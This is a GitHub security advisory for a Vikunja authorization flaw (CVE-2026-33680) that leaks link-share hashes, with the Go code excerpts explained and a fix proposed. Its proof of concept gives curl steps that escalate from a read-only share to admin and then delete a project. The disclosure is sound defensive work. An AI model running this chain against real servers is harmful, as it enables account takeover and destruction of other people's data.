# [H] Vikjuna: Link Share Hash Disclosure via ReadAll Endpoint Enables Permission Escalation

## Summary
Severity: High
Advisory: GHSA-8hp8-9fhr-pfm9
CVE: CVE-2026-33680
CWE: CWE-285
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-8hp8-9fhr-pfm9
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.2.2

## Details
## Summary

The `LinkSharing.ReadAll()` method allows link share authenticated users to list all link shares for a project, including their secret hashes. While `LinkSharing.CanRead()` correctly blocks link share users from reading individual shares via `ReadOne`, the `ReadAllWeb` handler bypasses this check by never calling `CanRead()`. An attacker with a read-only link share can retrieve hashes for write or admin link shares on the same project and authenticate with them, escalating to full admin access.

## Details

The vulnerability arises from an inconsistency between the `ReadOneWeb` and `ReadAllWeb` generic handlers and the `LinkSharing` permission model.

**`LinkSharing.CanRead()` correctly blocks link share users** (`pkg/models/link_sharing_permissions.go:25-29`):
```go
func (share *LinkSharing) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {
	if _, is := a.(*LinkSharing); is {
		return false, 0, nil  // Blocks link share users
	}
	// ...
}
```

**`ReadOneWeb` calls `CanRead()` before returning data** (`pkg/web/handler/read_one.go:64`):
```go
canRead, maxPermission, err := currentStruct.CanRead(s, currentAuth)
if !canRead {
    return echo.NewHTTPError(http.StatusForbidden, ...)
}
```

**`ReadAllWeb` does NOT call `CanRead()`** (`pkg/web/handler/read_all.go:106`):
```go
// Directly calls ReadAll without permission check
result, resultCount, numberOfItems, err := currentStruct.ReadAll(s, currentAuth, search, pageNumber, perPageNumber)
```

**`LinkSharing.ReadAll()` only checks project-level read access** (`pkg/models/link_sharing.go:228-236`):
```go
func (share *LinkSharing) ReadAll(s *xorm.Session, a web.Auth, ...) (...) {
    project := &Project{ID: share.ProjectID}
    can, _, err := project.CanRead(s, a)  // Link share users pass this!
    if !can {
        return nil, 0, 0, ErrGenericForbidden{}
    }
    // Returns all shares with hashes...
```

**`Project.CanRead()` allows link share users** (`pkg/models/project_permissions.go:105-108`):
```go
shareAuth, ok := a.(*LinkSharing)
if ok {
    return p.ID == shareAuth.ProjectID && (shareAuth.Permission == PermissionRead || ...), ...
}
```

The `Hash` field is exposed in JSON serialization (`pkg/models/link_sharing.go:50`):
```go
Hash string `xorm:"varchar(40) not null unique" json:"hash" param:"hash"`
```

While the `Password` field is cleared at line 276, the `Hash` — which is the secret token used to authenticate — is returned in full.

## PoC

**Prerequisites:** A project with multiple link shares at different permission levels (common scenario: a read-only share for public access and a write/admin share for collaborators).

**Step 1: Authenticate with a read-only link share**
```bash
# Authenticate with a read-only link share hash
curl -s -X POST http://localhost:3456/api/v1/shares/READ_ONLY_HASH/auth \
  | jq '.token'
# Returns: JWT token with permission=0 (read)
```

**Step 2: List all link shares for the project (hash disclosure)**
```bash
# Use the read-only JWT to list ALL shares including their hashes
curl -s -H "Authorization: Bearer <read-only-jwt>" \
  http://localhost:3456/api/v1/projects/PROJECT_ID/shares \
  | jq '.[].hash, .[].permission'
# Returns ALL shares with their hashes and permission levels:
# "READ_ONLY_HASH"   permission: 0
# "ADMIN_HASH"       permission: 2    <-- leaked!
```

**Step 3: Escalate to admin using the leaked hash**
```bash
# Authenticate with the admin link share hash
curl -s -X POST http://localhost:3456/api/v1/shares/ADMIN_HASH/auth \
  | jq '.token'
# Returns: JWT token with permission=2 (admin)
```

**Step 4: Exercise admin privileges**
```bash
# Delete the project (admin-only operation)
curl -s -X DELETE -H "Authorization: Bearer <admin-jwt>" \
  http://localhost:3456/api/v1/projects/PROJECT_ID
# Success — full admin access achieved from a read-only share
```

## Impact

- **Permission escalation:** An attacker with any link share URL (including read-only) can escalate to the highest permission level of any other link share on the same project
- **Credential disclosure:** All link share hashes for a project are exposed, which are effectively bearer tokens
- **No account required:** Link shares are designed for unauthenticated access — the attacker only needs a link share URL that was shared publicly or forwarded to them
- **Common scenario:** Projects with both read-only (public) and write/admin (collaborator) link shares are the standard use case for tiered sharing
- **Password-protected shares:** Even password-protected share hashes are leaked, though exploitation requires knowing/brute-forcing the password

## Recommended Fix

Add a link share user check at the beginning of `LinkSharing.ReadAll()`, mirroring the check in `CanRead()`:

```go
// In pkg/models/link_sharing.go, at the start of ReadAll():
func (share *LinkSharing) ReadAll(s *xorm.Session, a web.Auth, search string, page int, perPage int) (result interface{}, resultCount int, totalItems int64, err error) {
	// Don't allow link share users to list link shares
	if _, is := a.(*LinkSharing); is {
		return nil, 0, 0, ErrGenericForbidden{}
	}

	project := &Project{ID: share.ProjectID}
	// ... rest of method unchanged
```

Alternatively, as a defense-in-depth measure, exclude the `Hash` field from JSON serialization for list responses by using `json:"-"` and only returning it on creation. However, the primary fix should be the authorization check since the hash is needed in the creation response.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9
- https://nvd.nist.gov/vuln/detail/CVE-2026-33680
- https://github.com/go-vikunja/vikunja/commit/9efe1fadba817923c7c7f5953c3e9e9c5683bbf3
- https://github.com/go-vikunja/vikunja
- https://pkg.go.dev/vuln/GO-2026-4848
- https://vikunja.io/changelog/vikunja-v2.2.2-was-released
